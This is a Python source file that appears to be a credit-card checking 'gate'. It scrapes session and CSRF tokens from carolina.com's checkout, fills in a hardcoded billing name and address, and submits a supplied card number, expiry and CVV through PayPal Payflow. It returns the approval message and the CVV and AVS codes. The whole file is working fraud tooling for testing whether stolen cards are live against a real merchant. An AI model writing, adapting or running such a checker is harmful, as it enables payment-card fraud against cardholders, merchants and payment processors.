from httpx import AsyncClient
from utilsdf.functions import random_proxy, capture


async def payflowGate(card: str, month: str, year: str, cvv: str, session: AsyncClient):
    req4 = await session.post(
        "https://www.carolina.com/checkout/billing.jsp",
    )

    texto_1 = req4.text

    _dynSessConf = capture(
        texto_1, '<input name="_dynSessConf" type="hidden" value="', '"'
    )

    headers = {
        "Accept": "text/json",
        "Accept-Language": "es-ES,es;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.carolina.com",
        "Referer": "https://www.carolina.com/checkout/billing.jsp?_requestid=797580",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-gpc": "1",
    }

    params = {
        "_requestid": "797580",
    }

    data = {
        "_dyncharset": "UTF-8",
        "_dynSessConf": _dynSessConf,
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressErrorURL": "/checkout/billing.jsp",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressErrorURL": " ",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressSuccessURL": "/checkout/review.jsp",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressSuccessURL": " ",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsSuccessURL": "/checkout/review.jsp",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsSuccessURL": " ",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsErrorURL": "/checkout/billing.jsp",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsErrorURL": " ",
        "firstName": "Ales",
        "_D:firstName": " ",
        "lastName": "Pro",
        "_D:lastName": " ",
        "address1": "192 ALLEN ST",
        "_D:address1": " ",
        "postalCode": "06053-3056",
        "_D:postalCode": " ",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.zipcodeApiResponseCode": "0",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.zipcodeApiResponseCode": " ",
        "city": "NEW BRITAIN",
        "_D:city": " ",
        "_D:state": " ",
        "state": "CT",
        "userTypingInterval": "300",
        "/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPayPalPayment": "true",
        "_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPayPalPayment": " ",
        "_DARGS": "/checkout/gadgets/billing-form.jsp.billing_addr_form",
    }

    req2 = await session.post(
        "https://www.carolina.com/checkout/billing.jsp",
        params=params,
        headers=headers,
        data=data,
    )

    texto_2 = req2.text

    securetoken = capture(texto_2, "SECURETOKEN=", "&").strip()
    securetokenid = capture(texto_2, "SECURETOKENID=", "&").strip()

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "es-ES,es;q=0.9",
        "Connection": "keep-alive",
        "Referer": "https://www.carolina.com/",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-gpc": "1",
    }

    params = {
        "RESULT": "0",
        "SECURETOKEN": securetoken,
        "SECURETOKENID": securetokenid,
        "RESPMSG": "Approved",
    }

    req3 = await session.get(
        "https://payflowlink.paypal.com/",
        params=params,
        headers=headers,
    )

    texto_3 = req3.text

    csfr_token = capture(texto_3, '<input name="CSRF_TOKEN" type="hidden" value="', '"')

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://payflowlink.paypal.com",
        "Referer": "https://payflowlink.paypal.com/?RESULT=0&SECURETOKEN=P7FNEBo3RWkmWEmjMn4tKNwct&SECURETOKENID=0ne81M7JiY7H0u0eaL57Kdy2pqGL&RESPMSG=Approved",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-gpc": "1",
    }

    data = {
        "subaction": "",
        "CARDNUM": card,
        "EXPMONTH": month,
        "EXPYEAR": year,
        "CVV2": cvv,
        "startdate_month": "",
        "startdate_year": "",
        "issue_number": "",
        "METHOD": "C",
        "PAYMETHOD": "C",
        "FIRST_NAME": "Ales",
        "LAST_NAME": "Pro",
        "template": "",
        "ADDRESS": "192 ALLEN ST",
        "CITY": "NEW BRITAIN",
        "STATE": "CT",
        "ZIP": "060533056",
        "COUNTRY": "US",
        "PHONE": "",
        "EMAIL": "",
        "SHIPPING_FIRST_NAME": "",
        "SHIPPING_LAST_NAME": "",
        "ADDRESSTOSHIP": "",
        "CITYTOSHIP": "",
        "STATETOSHIP": "",
        "ZIPTOSHIP": "",
        "COUNTRYTOSHIP": "",
        "PHONETOSHIP": "",
        "EMAILTOSHIP": "",
        "TYPE": "A",
        "SHIPAMOUNT": "0.00",
        "TAX": "0.00",
        "VERBOSITY": "HIGH",
        "flag3dSecure": "",
        "STATE": "CT",
        "swipeData": "0",
        "SECURETOKEN": securetoken,
        "SECURETOKENID": securetokenid,
        "PARMLIST": "",
        "MODE": "",
        "CSRF_TOKEN": csfr_token,
        "referringTemplate": "minlayout",
    }

    req5 = await session.post(
        "https://payflowlink.paypal.com/processTransaction.do",
        headers=headers,
        data=data,
    )

    texto_4 = req5.text

    msj = capture(texto_4, '<input type="hidden" name="RESPMSG" value="', '"')
    cvcode = capture(texto_4, '<input type="hidden" name="PROCCVV2" value="', '"')
    avscode = capture(texto_4, '<input type="hidden" name="PROCAVS" value="', '"')

    if msj == None:
        msj = "Error"

    return msj, cvcode, avscode
